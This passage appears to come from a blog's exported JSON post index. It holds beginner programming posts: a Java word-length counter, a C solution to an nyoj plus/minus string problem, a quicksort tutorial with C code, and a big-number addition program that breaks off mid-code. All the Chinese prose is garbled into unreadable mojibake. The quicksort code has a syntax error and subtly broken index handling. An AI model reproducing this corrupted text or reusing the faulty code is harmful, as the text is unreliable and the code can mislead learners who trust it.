11ä¸ªæ•°å­—ï¼Œä¾æ¬¡æ˜¯æ€»çš„å•è¯æ•°é‡ã€1ä¸ªå­—æ¯çš„å•è¯æ•°é‡ã€2ä¸ªå­—æ¯çš„å•è¯æ•°é‡ã€‚ã€‚ã€‚10ä¸ªå­—æ¯çš„å•è¯çš„æ•°é‡ã€‚æ¯ä¸ªæ•°å­—åæœ‰ä¸€ä¸ªç©ºæ ¼ã€‚è¡Œæœ«æœ‰ä¸€ä¸ªå›è½¦æ¢è¡Œã€‚ è¾“å…¥æ ·ä¾‹ï¼š &quot;What you see is a very hefty response,&quot; said CNN Aviation Correspondent Rene Marsh. è¾“å‡ºæ ·ä¾‹ï¼š 14 1 1 3 3 2 1 0 1 0 1 æ—¶é—´é™åˆ¶ï¼š500mså†…å­˜é™åˆ¶ï¼š32000kb*/ import java.util.Scanner; public class StatisticalWord {//ç»Ÿè®¡å•è¯ä¸ªæ•° public static void main(String[] args) { Scanner input=new Scanner(System.in); int count=0; int[] counter=new int[11]; while(input.hasNext()){ String str=input.next(); if(str.length()&lt;=10&amp;&amp;str.length()&gt;=0){ counter[str.length()]++; } count++; } System.out.print(count); for(int i=1;i&lt;=10;i++) System.out.print(&quot; &quot;+counter[i]); System.out.println(); input.close(); } }æœ¬é¢˜æ˜¯é›¶åŸºç¡€å­¦Javaè¯­è¨€æœŸæœ«è€ƒè¯•çš„ç¼–ç¨‹é¢˜æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ itâ€™sâ€ç®—ä¸€ä¸ªå•è¯ï¼Œé•¿åº¦ä¸º4 æ¯ä¸ªæ•°å­—åæœ‰ä¸€ä¸ªç©ºæ ¼ã€‚è¡Œæœ«æœ‰ä¸€ä¸ªå›è½¦æ¢è¡Œã€‚ è¿™é‡Œçš„response,â€åé¢è·Ÿäº†ç©ºæ ¼ æœ€åæµ‹è¯•æ—¶ï¼Œåº”è¯¥å…ˆå°†è¦æµ‹è¯•çš„å¥å­ï¼Œctrl+zç²˜è´´åˆ°æ§åˆ¶å°ä¸Šï¼Œç„¶åenterï¼Œç„¶åctrl+zï¼ˆæ­¤å¤„æ˜¯ä¸ºäº†EOFï¼‰ æ–¹æ³•äºŒï¼šStringä¸­æ–¹æ³•split() split æ–¹æ³•ï¼šå°†ä¸€ä¸ªå­—ç¬¦ä¸²åˆ†å‰²ä¸ºå­å­—ç¬¦ä¸²ï¼Œç„¶åå°†ç»“æœä½œä¸ºå­—ç¬¦ä¸²æ•°ç»„è¿”å›ã€‚ stringObj.split([separator]ï¼Œ[limit]) å‚æ•°ï¼šstringObj å¿…é€‰é¡¹ã€‚è¦è¢«åˆ†è§£çš„ String å¯¹è±¡æˆ–æ–‡å­—ã€‚è¯¥å¯¹è±¡ä¸ä¼šè¢« split æ–¹æ³•ä¿®æ”¹ã€‚ separator å¯é€‰é¡¹ã€‚å­—ç¬¦ä¸²æˆ– æ­£åˆ™è¡¨è¾¾å¼ å¯¹è±¡ï¼Œå®ƒæ ‡è¯†äº†åˆ†éš”å­—ç¬¦ä¸²æ—¶ä½¿ç”¨çš„æ˜¯ä¸€ä¸ªè¿˜æ˜¯å¤šä¸ªå­—ç¬¦ã€‚å¦‚æœå¿½ ç•¥è¯¥é€‰é¡¹ï¼Œè¿”å›åŒ…å«æ•´ä¸ªå­—ç¬¦ä¸²çš„å•ä¸€å…ƒç´ æ•°ç»„ã€‚ limitå¯é€‰é¡¹ã€‚è¯¥å€¼ç”¨æ¥é™åˆ¶è¿”å›æ•°ç»„ä¸­çš„å…ƒç´ ä¸ªæ•°ã€‚ è¯´æ˜ï¼šsplit æ–¹æ³•çš„ç»“æœæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„ï¼Œåœ¨ stingObj ä¸­æ¯ä¸ªå‡ºç° separator çš„ä½ç½®éƒ½è¦è¿›è¡Œåˆ†è§£ã€‚separatorä¸ä½œä¸ºä»»ä½•æ•°ç»„å…ƒç´ çš„éƒ¨åˆ†è¿”å›ã€‚ split çš„å®ç°ç›´æ¥è°ƒç”¨çš„ matcher ç±»çš„ split çš„æ–¹æ³•ã€‚â€œ . â€åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­æœ‰ç‰¹æ®Šçš„å«ä¹‰ï¼Œå› æ­¤æˆ‘ä»¬ä½¿ç”¨çš„æ—¶å€™å¿…é¡»è¿›è¡Œè½¬ä¹‰â€\\.â€ å¦‚æœç”¨ç«–çº¿â€œ|â€åˆ†éš”çš„è¯ï¼Œå°†å‡ºç°ä¸å¯å¾—åˆ°çš„ç»“æœï¼Œå¿…é¡»æ”¹ä¸ºâ€œ|â€ ï¼Œ+ * ä¸æ˜¯æœ‰æ•ˆçš„æ¨¡å¼åŒ¹é…è§„åˆ™è¡¨è¾¾å¼ï¼Œç”¨â€//*â€ â€œ//+â€è½¬ä¹‰åå³å¯å¾—åˆ°æ­£ç¡®çš„ç»“æœã€‚ import java.util.*; public class Main { public static void main(String a[]) { Scanner input=new Scanner(System.in); String Sentence=input.nextLine(); count(Sentence); } public static void count(String str){ int count=0; String string=str; int a[]=new int[11]; String s[]=string.split(&quot; &quot;); for(int i=0;i&lt;s.length;i++) if(s[i].length()&lt;=10&amp;&amp;s[i].length()&gt;=0) a[s[i].length()]++; System.out.print(s.length); for(int i=1;i&lt;=10;i++) System.out.print(&quot; &quot;+a[i]); System.out.println(); } }","categories":[],"tags":[{"name":"Javaå­¦ä¹ ","slug":"Javaå­¦ä¹ ","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"java","slug":"java","permalink":"http://yoursite.com/tags/java/"}]},{"title":"å¼€å­¦è®°","slug":"å¼€å­¦è®°","date":"2016-09-02T14:34:27.000Z","updated":"2020-11-14T17:12:10.977Z","comments":true,"path":"2016/09/02/å¼€å­¦è®°/","link":"","permalink":"http://yoursite.com/2016/09/02/%E5%BC%80%E5%AD%A6%E8%AE%B0/","excerpt":"","text":"2016.09.02å¼€å­¦å‡ å¤©äº†ï¼Œè¯¾ç¨‹ç´¢ç„¶æ— å‘³ï¼Œä¸€ç›´æ²¡ç¢°ä»£ç ï¼Œä¸»è¦æ˜¯æœ¬èƒ½çš„å®³æ€•ï¼›æš‘å‡ï¼Œå­¦è½¦ï¼Œæ²¡è¿‡ï¼›4çº§ç«Ÿç„¶è¿‡äº†ï¼Œä¹Ÿä¸é”™äº†ï¼›å¤§éƒ¨åˆ†æ—¶é—´ï¼ŒèŠ±åœ¨äº†æ¸¸æˆå’Œå¨±ä¹ä¸Šï¼›æˆ‘åœ¨æƒ³å•Šï¼Œäººä¸èƒ½å¤ªä¸“æ³¨å­¦ä¹ ï¼Œè¦æ‡‚ç‚¹ç”Ÿæ´»çš„æƒ…è¶£ï¼›ç°åœ¨åœ¨çœ‹è¯›ä»™ï¼Œçœ‹å®Œå†å­¦ä¹ ï¼Œæ— æ³•å­¦ä¹ ï¼Œæ²‰è¿·å°è¯´ï¼›ç¾å¦ˆï¼šè¿™ä¸ªä¸–ç•Œå€¼å¾—æˆ‘ä»¬ä¸ºä¹‹å¥‹æ–—ï¼","categories":[],"tags":[{"name":"ç”Ÿæ´»","slug":"ç”Ÿæ´»","permalink":"http://yoursite.com/tags/%E7%94%9F%E6%B4%BB/"}]},{"title":"nyoj 915 +-å­—ç¬¦ä¸²","slug":"nyoj 915 +-å­—ç¬¦ä¸²","date":"2016-07-29T02:46:43.000Z","updated":"2020-11-14T17:12:11.842Z","comments":true,"path":"2016/07/29/nyoj 915 +-å­—ç¬¦ä¸²/","link":"","permalink":"http://yoursite.com/2016/07/29/nyoj%20915%20+-%E5%AD%97%E7%AC%A6%E4%B8%B2/","excerpt":"","text":"é¢˜ç›®æè¿°Shivaå¾—åˆ°äº†ä¸¤ä¸ªåªæœ‰åŠ å·å’Œå‡å·çš„å­—ç¬¦ä¸²ï¼Œå­—ä¸²é•¿åº¦ç›¸åŒã€‚Shivaä¸€æ¬¡å¯ä»¥æŠŠä¸€ä¸ªåŠ å·å’Œå®ƒç›¸é‚»çš„å‡å·äº¤æ¢ã€‚ä»–æƒ³çŸ¥é“æœ€å°‘éœ€è¦å¤šå°‘æ¬¡æ“ä½œæ‰èƒ½æŠŠç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²å˜æ¢æˆç¬¬äºŒä¸ªå­—ç¬¦ä¸²ã€‚ä½ ç°åœ¨è¦å»å¸®åŠ©ä»–å®Œæˆé‚£ä¸ªè¿™ä¸ªé—®é¢˜ã€‚ è¾“å…¥å¤šç»„æµ‹è¯•æ•°æ® æ¯ç»„æ•°æ®æœ‰ä¸¤è¡Œï¼Œæ¯è¡ŒåŒ…å«ä¸€ä¸ªç”±â€+â€å’Œâ€-â€œæœ€æˆçš„å­—ç¬¦ä¸²ã€‚æ¯ä¸ªå­ç¬¦ä¸²é•¿åº¦ä¸è¶…è¿‡5000ã€‚ è¾“å‡ºä»…ä¸€ä¸ªæ•´æ•°ï¼Œè¾“å‡ºæœ€å°‘éœ€è¦æ“ä½œçš„æ¬¡æ•°ã€‚å¦‚æœç­”æ¡ˆä¸å­˜åœ¨ï¼Œè¾“å‡º-1ã€‚ æ ·ä¾‹è¾“å…¥++-+--+ -++--++ æ ·ä¾‹è¾“å‡º4 æ€è·¯ï¼šå¤§å¾ªç¯ï¼Œé€šè¿‡éå†str1ï¼Œæ¯”è¾ƒstr2ï¼Œ 1.str1[i]==str2[i],å‘åéå† 2.str1[i]!=str2[i],é€šè¿‡j=i+1éå†str2,åˆ†ä¸ºä¸¤ç§firststr1[i]==str2[j],å°†str2[j]=str2[i];èµ‹å€¼å³å¯ secondj=len,ä¸æ»¡è¶³ï¼Œæ²¡æœ‰æ‰¾åˆ°str1[i]è¿™ä¸ªå­—ç¬¦ï¼Œcount=-1ï¼Œbreakï¼› #include &lt;stdio.h&gt; #include &lt;string.h&gt; int main() { char str1[5001],str2[5001],temp; int len,i,j,k,count; while(scanf(&quot;%s%s&quot;,str1,str2)!=EOF) { count=0; len=strlen(str1); for(i=0;i&lt;len;i++) { if(str1[i]!=str2[i]) { for(j=i+1;j&lt;len;j++) if(str1[i]==str2[j]) { break; } if(j==len) { count=-1; break; } count+=(j-i); str2[j]=str2[i]; } } printf(&quot;%d\\n&quot;,count); } return 0; }","categories":[],"tags":[]},{"title":"å¿«é€Ÿæ’åº","slug":"å¿«é€Ÿæ’åº","date":"2016-06-30T11:04:55.000Z","updated":"2020-11-14T17:12:16.839Z","comments":true,"path":"2016/06/30/å¿«é€Ÿæ’åº/","link":"","permalink":"http://yoursite.com/2016/06/30/%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/","excerpt":"","text":"å¿«é€Ÿæ’åºï¼šé‡‡ç”¨åˆ†æ²»æ€æƒ³1.åˆ†æ²»æ€æƒ³ï¼šåˆ†æ²»ç®—æ³•çš„åŸºæœ¬æ€æƒ³æ˜¯å°†ä¸€ä¸ªè§„æ¨¡ä¸ºNçš„é—®é¢˜åˆ†è§£ä¸ºKä¸ªè§„æ¨¡è¾ƒå°çš„å­é—®é¢˜ï¼Œè¿™äº›å­é—®é¢˜ç›¸äº’ç‹¬ç«‹ä¸”ä¸åŸé—®é¢˜æ€§è´¨ç›¸åŒã€‚æ±‚å‡ºå­é—®é¢˜çš„è§£ï¼Œå°±å¯å¾—åˆ°åŸé—®é¢˜çš„è§£ã€‚å³ä¸€ç§åˆ†ç›®æ ‡å®Œæˆç¨‹åºç®—æ³•ï¼Œç®€å•é—®é¢˜å¯ç”¨äºŒåˆ†æ³•å®Œæˆã€‚ æˆ‘ä»¬ç°åœ¨å¯¹â€œ6 1 2 7 9 3 4 5 10 8â€è¿™ä¸ª10ä¸ªæ•°è¿›è¡Œæ’åºæ–¹æ³•å…¶å®å¾ˆç®€å•ï¼šåˆ†åˆ«ä»åˆå§‹åºåˆ—â€œ6 1 2 7 9 3 4 5 108â€ä¸¤ç«¯å¼€å§‹â€œæ¢æµ‹â€ã€‚å…ˆä»å³å¾€å·¦æ‰¾ä¸€ä¸ªå°äº6çš„æ•°ï¼Œå†ä»å·¦å¾€å³æ‰¾ä¸€ä¸ªå¤§äº6çš„æ•°ï¼Œç„¶åäº¤æ¢ä»–ä»¬ã€‚è¿™é‡Œå¯ä»¥ç”¨ä¸¤ä¸ªå˜é‡iå’Œjï¼Œåˆ†åˆ«æŒ‡å‘åºåˆ—æœ€å·¦è¾¹å’Œæœ€å³è¾¹ã€‚æˆ‘ä»¬ä¸ºè¿™ä¸¤ä¸ªå˜é‡èµ·ä¸ªå¥½å¬çš„åå­—â€œå“¨å…µiâ€å’Œâ€œå“¨å…µjâ€ã€‚åˆšå¼€å§‹çš„æ—¶å€™è®©å“¨å…µiæŒ‡å‘åºåˆ—çš„æœ€å·¦è¾¹ï¼ˆå³i=1ï¼‰ï¼ŒæŒ‡å‘æ•°å­—6ã€‚è®©å“¨å…µjæŒ‡å‘åºåˆ—çš„æœ€å³è¾¹ï¼ˆå³j=10ï¼‰ï¼ŒæŒ‡å‘æ•°å­—8ã€‚ é¦–å…ˆå“¨å…µjå¼€å§‹å‡ºåŠ¨ã€‚å› ä¸ºæ­¤å¤„è®¾ç½®çš„åŸºå‡†æ•°æ˜¯æœ€å·¦è¾¹çš„æ•°ï¼Œæ‰€ä»¥éœ€è¦è®©å“¨å…µjå…ˆå‡ºåŠ¨ï¼Œè¿™ä¸€ç‚¹éå¸¸é‡è¦ï¼ˆè¯·è‡ªå·±æƒ³ä¸€æƒ³ä¸ºä»€ä¹ˆï¼‰ã€‚å“¨å…µjä¸€æ­¥ä¸€æ­¥åœ°å‘å·¦æŒªåŠ¨ï¼ˆå³j--ï¼‰ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªå°äº6çš„æ•°åœä¸‹æ¥ã€‚æ¥ä¸‹æ¥å“¨å…µiå†ä¸€æ­¥ä¸€æ­¥å‘å³æŒªåŠ¨ï¼ˆå³i++ï¼‰ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªæ•°å¤§äº6çš„æ•°åœä¸‹æ¥ã€‚æœ€åå“¨å…µjåœåœ¨äº†æ•°å­—5é¢å‰ï¼Œå“¨å…µiåœåœ¨äº†æ•°å­—7é¢å‰ã€‚ ç°åœ¨äº¤æ¢å“¨å…µiå’Œå“¨å…µjæ‰€æŒ‡å‘çš„å…ƒç´ çš„å€¼ã€‚äº¤æ¢ä¹‹åçš„åºåˆ—å¦‚ä¸‹ã€‚ 6 1 2 5 9 3 4 7 10 8 åˆ°æ­¤ï¼Œç¬¬ä¸€æ¬¡äº¤æ¢ç»“æŸã€‚æ¥ä¸‹æ¥å¼€å§‹å“¨å…µjç»§ç»­å‘å·¦æŒªåŠ¨ï¼ˆå†å‹æƒ…æé†’ï¼Œæ¯æ¬¡å¿…é¡»æ˜¯å“¨å…µjå…ˆå‡ºå‘ï¼‰ã€‚ä»–å‘ç°äº†4ï¼ˆæ¯”åŸºå‡†æ•°6è¦å°ï¼Œæ»¡è¶³è¦æ±‚ï¼‰ä¹‹ååœäº†ä¸‹æ¥ã€‚å“¨å…µiä¹Ÿç»§ç»­å‘å³æŒªåŠ¨çš„ï¼Œä»–å‘ç°äº†9ï¼ˆæ¯”åŸºå‡†æ•°6è¦å¤§ï¼Œæ»¡è¶³è¦æ±‚ï¼‰ä¹‹ååœäº†ä¸‹æ¥ã€‚æ­¤æ—¶å†æ¬¡è¿›è¡Œäº¤æ¢ï¼Œäº¤æ¢ä¹‹åçš„åºåˆ—å¦‚ä¸‹ã€‚ 6 1 2 5 4 3 9 7 10 8 ç¬¬äºŒæ¬¡äº¤æ¢ç»“æŸï¼Œâ€œæ¢æµ‹â€ç»§ç»­ã€‚å“¨å…µjç»§ç»­å‘å·¦æŒªåŠ¨ï¼Œä»–å‘ç°äº†3ï¼ˆæ¯”åŸºå‡†æ•°6è¦å°ï¼Œæ»¡è¶³è¦æ±‚ï¼‰ä¹‹ååˆåœäº†ä¸‹æ¥ã€‚å“¨å…µiç»§ç»­å‘å³ç§»åŠ¨ï¼Œç³Ÿå•¦ï¼æ­¤æ—¶å“¨å…µiå’Œå“¨å…µjç›¸é‡äº†ï¼Œå“¨å…µiå’Œå“¨å…µjéƒ½èµ°åˆ°3é¢å‰ã€‚è¯´æ˜æ­¤æ—¶â€œæ¢æµ‹â€ç»“æŸã€‚æˆ‘ä»¬å°†åŸºå‡†æ•°6å’Œ3è¿›è¡Œäº¤æ¢ã€‚äº¤æ¢ä¹‹åçš„åºåˆ—å¦‚ä¸‹ã€‚3 1 2 5 4 6 9 7 10 8 ã€åˆ°æ­¤ç¬¬ä¸€è½®â€œæ¢æµ‹â€çœŸæ­£ç»“æŸã€‚æ­¤æ—¶ä»¥åŸºå‡†æ•°6ä¸ºåˆ†ç•Œç‚¹ï¼Œ6å·¦è¾¹çš„æ•°éƒ½å°äºç­‰äº6ï¼Œ6å³è¾¹çš„æ•°éƒ½å¤§äºç­‰äº6ã€‚å›é¡¾ä¸€ä¸‹åˆšæ‰çš„è¿‡ç¨‹ï¼Œå…¶å®å“¨å…µjçš„ä½¿å‘½å°±æ˜¯è¦æ‰¾å°äºåŸºå‡†æ•°çš„æ•°ï¼Œè€Œå“¨å…µiçš„ä½¿å‘½å°±æ˜¯è¦æ‰¾å¤§äºåŸºå‡†æ•°çš„æ•°ï¼Œç›´åˆ°iå’Œjç¢°å¤´ä¸ºæ­¢ã€‚ OKï¼Œè§£é‡Šå®Œæ¯•ã€‚ç°åœ¨åŸºå‡†æ•°6å·²ç»å½’ä½ï¼Œå®ƒæ­£å¥½å¤„åœ¨åºåˆ—çš„ç¬¬6ä½ã€‚æ­¤æ—¶æˆ‘ä»¬å·²ç»å°†åŸæ¥çš„åºåˆ—ï¼Œä»¥6ä¸ºåˆ†ç•Œç‚¹æ‹†åˆ†æˆäº†ä¸¤ä¸ªåºåˆ—ï¼Œå·¦è¾¹çš„åºåˆ—æ˜¯â€œ3 1 2 5 4â€ï¼Œå³è¾¹çš„åºåˆ—æ˜¯â€œ9 7 10 8â€ã€‚æ¥ä¸‹æ¥è¿˜éœ€è¦åˆ†åˆ«å¤„ç†è¿™ä¸¤ä¸ªåºåˆ—ã€‚å› ä¸º6å·¦è¾¹å’Œå³è¾¹çš„åºåˆ—ç›®å‰éƒ½è¿˜æ˜¯å¾ˆæ··ä¹±çš„ã€‚ä¸è¿‡ä¸è¦ç´§ï¼Œæˆ‘ä»¬å·²ç»æŒæ¡äº†æ–¹æ³•ï¼Œæ¥ä¸‹æ¥åªè¦æ¨¡æ‹Ÿåˆšæ‰çš„æ–¹æ³•åˆ†åˆ«å¤„ç†6å·¦è¾¹å’Œå³è¾¹çš„åºåˆ—å³å¯ã€‚ç°åœ¨å…ˆæ¥å¤„ç†6å·¦è¾¹çš„åºåˆ—ç°å§ã€‚ å·¦è¾¹çš„åºåˆ—æ˜¯â€œ3 1 2 5 4â€ã€‚è¯·å°†è¿™ä¸ªåºåˆ—ä»¥3ä¸ºåŸºå‡†æ•°è¿›è¡Œè°ƒæ•´ï¼Œä½¿å¾—3å·¦è¾¹çš„æ•°éƒ½å°äºç­‰äº3ï¼Œ3å³è¾¹çš„æ•°éƒ½å¤§äºç­‰äº3ã€‚å¥½äº†å¼€å§‹åŠ¨ç¬”å§ã€‚ å¦‚æœä½ æ¨¡æ‹Ÿçš„æ²¡æœ‰é”™ï¼Œè°ƒæ•´å®Œæ¯•ä¹‹åçš„åºåˆ—çš„é¡ºåºåº”è¯¥æ˜¯ã€‚ 2 1 3 5 4 OKï¼Œç°åœ¨3å·²ç»å½’ä½ã€‚æ¥ä¸‹æ¥éœ€è¦å¤„ç†3å·¦è¾¹çš„åºåˆ—â€œ2 1â€å’Œå³è¾¹çš„åºåˆ—â€œ5 4â€ã€‚å¯¹åºåˆ—â€œ2 1â€ä»¥2ä¸ºåŸºå‡†æ•°è¿›è¡Œè°ƒæ•´ï¼Œå¤„ç†å®Œæ¯•ä¹‹åçš„åºåˆ—ä¸ºâ€œ1 2â€ï¼Œåˆ°æ­¤2å·²ç»å½’ä½ã€‚åºåˆ—â€œ1â€åªæœ‰ä¸€ä¸ªæ•°ï¼Œä¹Ÿä¸éœ€è¦è¿›è¡Œä»»ä½•å¤„ç†ã€‚è‡³æ­¤æˆ‘ä»¬å¯¹åºåˆ—â€œ2 1â€å·²å…¨éƒ¨å¤„ç†å®Œæ¯•ï¼Œå¾—åˆ°åºåˆ—æ˜¯â€œ1 2â€ã€‚åºåˆ—â€œ5 4â€çš„å¤„ç†ä¹Ÿä»¿ç…§æ­¤æ–¹æ³•ï¼Œæœ€åå¾—åˆ°çš„åºåˆ—å¦‚ä¸‹ã€‚ 1 2 3 4 5 6 9 7 10 8 å¯¹äºåºåˆ—â€œ9 7 10 8â€ä¹Ÿæ¨¡æ‹Ÿåˆšæ‰çš„è¿‡ç¨‹ï¼Œç›´åˆ°ä¸å¯æ‹†åˆ†å‡ºæ–°çš„å­åºåˆ—ä¸ºæ­¢ã€‚æœ€ç»ˆå°†ä¼šå¾—åˆ°è¿™æ ·çš„åºåˆ—ï¼Œå¦‚ä¸‹ã€‚ 1 2 3 4 5 6 7 8 9 10 åˆ°æ­¤ï¼Œæ’åºå®Œå…¨ç»“æŸã€‚ç»†å¿ƒçš„åŒå­¦å¯èƒ½å·²ç»å‘ç°ï¼Œå¿«é€Ÿæ’åºçš„æ¯ä¸€è½®å¤„ç†å…¶å®å°±æ˜¯å°†è¿™ä¸€è½®çš„åŸºå‡†æ•°å½’ä½ï¼Œç›´åˆ°æ‰€æœ‰çš„æ•°éƒ½å½’ä½ä¸ºæ­¢ï¼Œæ’åºå°±ç»“æŸäº†ã€‚ä¸‹é¢ä¸Šä¸ªéœ¸æ°”çš„å›¾æ¥æè¿°ä¸‹æ•´ä¸ªç®—æ³•çš„å¤„ç†è¿‡ç¨‹ã€‚ ä»¥ä¸Šè½¬è‡ª [ http://ahalei.blog.51cto.com/4767671/1365285](http://ahalei.blog.51cto.com/4767671/1365285) å†™çš„éå¸¸å¥½ 3.å…³äºå¿«é€Ÿæ’åºæ³•ä¸ºä»€ä¹ˆä¸€å®šè¦ä»å³è¾¹å¼€å§‹çš„åŸå›  while(a[i]&lt;a[left]&amp;&amp;i&lt;j) i++; while(a[j]&gt;a[left]&amp;&amp;i&lt;j) j--;è¿™é‡Œä¸¤ä¸ªwhileçš„é¡ºåºæ˜¯ä¸èƒ½æ”¹å˜çš„ï¼Œæƒ³ä¸€æƒ³ï¼šå‡è®¾å¯¹å¦‚ä¸‹è¿›è¡Œæ’åºï¼šå¦‚ä¸Šå›¾ï¼Œ6åœ¨å·¦ï¼Œ9åœ¨å³ æˆ‘ä»¬å°†6ä½œä¸ºåŸºæ•°ã€‚å‡è®¾ä»å·¦è¾¹å¼€å§‹ï¼ˆä¸æ­£ç¡®ç¨‹åºæ­£å¥½ç›¸åï¼‰äºæ˜¯i å°±ä¼šç§»åŠ¨åˆ°ç°åœ¨çš„ æ•°å­— 7 é‚£ä¸ªä½ç½®åœä¸‹æ¥ï¼Œè€Œ j åŸæ¥åœ¨ æ•°å­— 9 é‚£ä¸ªä½ç½® ï¼Œå› ä¸º while(arr[j]&gt;=temp&amp;&amp;i&lt;j) äºæ˜¯ï¼Œj ä¹Ÿä¼šåœç•™åœ¨æ•°å­—7 é‚£ä¸ªä½ç½®ï¼Œäºæ˜¯é—®é¢˜æ¥äº†ã€‚å½“ä½ æœ€åäº¤æ¢åŸºæ•°6ä¸7æ—¶ï¼Œä¸å¯¹å‘€ï¼ï¼ã€‚ é—®é¢˜åœ¨äºå½“æˆ‘ä»¬å…ˆä»åœ¨è¾¹å¼€å§‹æ—¶ï¼Œé‚£ä¹ˆ i æ‰€åœç•™çš„é‚£ä¸ªä½ç½®è‚¯å®šæ˜¯å¤§äºåŸºæ•°6çš„ï¼Œè€Œåœ¨ä¸Šè¿°ä¾‹å­ä¸­ï¼Œä¸ºäº†æ»¡è¶³ i&lt;j äºæ˜¯ jä¹Ÿåœç•™åœ¨7çš„ä½ç½®ä½†æœ€åäº¤æ¢å›å»çš„æ—¶å€™ï¼Œ7å°±åˆ°äº†å·¦è¾¹ï¼Œä¸è¡Œï¼Œå› ä¸ºæˆ‘ä»¬åŸæœ¬äº¤æ¢åæ•°å­—6åœ¨è¾¹åº”è¯¥æ˜¯å…¨éƒ¨å°äº6ï¼Œå³è¾¹å…¨éƒ¨å¤§äº6.ä½†ç°åœ¨ä¸è¡Œäº†ã€‚äºæ˜¯ï¼Œæˆ‘ä»¬å¿…é¡»ä»å³è¾¹å¼€å§‹ï¼Œä¹Ÿå°±æ˜¯ä»åŸºæ•°çš„å¯¹é¢å¼€å§‹ã€‚ è½¬è‡ª http://blog.csdn.net/w282529350/article/details/50982650 ä¸œæ‹¼è¥¿å‡‘æŠ„å¥½çš„ï¼Œä¸‹é¢è‡ªå·±æ¨¡ä»¿åˆ«äººçš„å¿«é€Ÿæ’åºè¿™é‡Œå†™ä»£ç ç‰‡ #include &lt;stdio.h&gt; void QuickSort(int a[],int left,int right) { int i=left+1,j=right,temp,; if(left&gt;=right) return; while(i!=j) { while(a[j]&gt;a[left]&amp;&amp;i&lt;j) j--; while(a[i]&lt;a[left]&amp;&amp;i&lt;j) i++; if(i&lt;j) { temp=a[i];a[i]=a[j];a[j]=temp; } } temp=a[left];a[left]=a[j];a[j]=temp; QuickSort(a,left,i-1); QuickSort(a,i+1,right); } int main() { int a[]={6,1,2,7,9,3,4,5,10,8},i; QuickSort(a,0,sizeof(a)/sizeof(int)-1); for(i=0;i&lt;10;i++) printf(&quot;%d\\t&quot;,a[i]); return 0; }markdownç¼–è¾‘å¥½ä¸èˆ’æœ","categories":[],"tags":[{"name":"ç®—æ³•","slug":"ç®—æ³•","permalink":"http://yoursite.com/tags/%E7%AE%97%E6%B3%95/"},{"name":"å¿«é€Ÿæ’åº","slug":"å¿«é€Ÿæ’åº","permalink":"http://yoursite.com/tags/%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/"},{"name":"åˆ†æ²»ç®—æ³•","slug":"åˆ†æ²»ç®—æ³•","permalink":"http://yoursite.com/tags/%E5%88%86%E6%B2%BB%E7%AE%97%E6%B3%95/"},{"name":"æ’åº","slug":"æ’åº","permalink":"http://yoursite.com/tags/%E6%8E%92%E5%BA%8F/"}]},{"title":"A + B Problem IIï¼ˆé«˜ç²¾åº¦åŠ æ³•ï¼‰","slug":"A + B Problem IIï¼ˆé«˜ç²¾åº¦åŠ æ³•ï¼‰","date":"2016-06-24T10:02:16.000Z","updated":"2020-11-14T17:12:17.445Z","comments":true,"path":"2016/06/24/A + B Problem IIï¼ˆé«˜ç²¾åº¦åŠ æ³•ï¼‰/","link":"","permalink":"http://yoursite.com/2016/06/24/A%20+%20B%20Problem%20II%EF%BC%88%E9%AB%98%E7%B2%BE%E5%BA%A6%E5%8A%A0%E6%B3%95%EF%BC%89/","excerpt":"","text":"#include &lt;stdio.h&gt; #include &lt;string.h&gt; int main() { int lenmax,la,lb,k,i,n,len,lenmin,l=1; char a[1000]; char b[1000]; char sum[1000]; char ch; scanf(&quot;%d&quot;,&amp;n); getchar(); while(n--) { scanf(&quot;%s&quot;,&amp;a); scanf(&quot;%s&quot;,&amp;b);//è¾“å…¥aå’Œb//å¥¥æ³¨æ„è¾“å…¥æ—¶y la=strlen(a)-1; lb=strlen(b)-1; lenmax=(la&gt;lb?la:lb); lenmin=(la&lt;lb)?la:lb; for(i=0;i&lt;=lenmax+1;i++)//å°†0ä½ç½®ç•™å‡ºæ¥ï¼Œé˜²æ­¢è¶Šä½ï¼Œä¸€å…±len+1ä½ sum[i]=&apos;0&apos;; //å¼€å§‹è®¡ç®— //è®¡ç®—åˆ†2ç±»,ä¸€ç±»la==lb,äºŒç±»la&gt;lbæˆ–la&lt;lb for(i=lenmax+1;lenmin!=-1;i--)//å†™ç›¸åŒçš„éƒ¨åˆ†ï¼Œä»åå¾€å‰ï¼Œè¦é˜²æ­¢è¿›ä½ { if(sum[i]+a[la]+b[lb]&gt;=154)//154æ˜¯ä¸‰ä¸ªæ•°åŠ èµ·æ¥ç­‰äº10æ—¶çš„ascllçš„å’Œï¼Œå¦‚1+4+5=49+52+53=154 { sum[i]=sum[i]+a[la--]+b[lb--]-106;//106æ˜¯é€šè¿‡1+9+1-10=1=49=ï¼ˆ49+57+49ï¼‰-106 sum[i-1]=&apos;1&apos;; } else { sum[i]=a[la--]+b[lb--]+sum[i]-96; } lenmin--; } /*ä»¥ä¸Šä¸ºä¸¤ä¸ªæ•°å­—ç›¸åŒçš„æœ«ä½ï¼Œä¸‹é¢å¼€å§‹è®¨è®ºå¦‚æœæœ‰å‰©ä½™*/ if(la&lt;0) { for(k=i;k&gt;=1;k--) { if(sum[k]+b[lb]&gt;=106) { sum[k]=sum[k]+b[lb--]-58;//1+9=10=49+57-58=48 sum[k-1]=&apos;1&apos;; } else { sum[k]=b[lb--]+sum[k]-48;//1+0-x=1=49+48-48=49 } } } else { for(k=i;k&gt;=1;k--) { if(sum[k]+a[la]&gt;=106) { sum[k]=sum[k]+a[la--]-58;//1+9=10=49+57-58=48 sum[k-1]=&apos;1&apos;; } else { sum[k]=a[la--]+sum[k]-48; } } } //æ‰“å°sumæ•°ç»„ printf(&quot;Case %d:\\n%s + %s = &quot;,l,a,b); if(sum[0]&gt;&apos;0&apos;&amp;&amp;sum[0]&lt;=&apos;9&apos;) { printf(&quot;%c&quot;,sum[0]); } for(k=1;k&lt;=lenmax+1;k++) printf(&quot;%c&quot;,sum[k]); printf(&quot;\\n&quot;); l++; if(n)printf(&quot;\\n&quot;); } return 0; 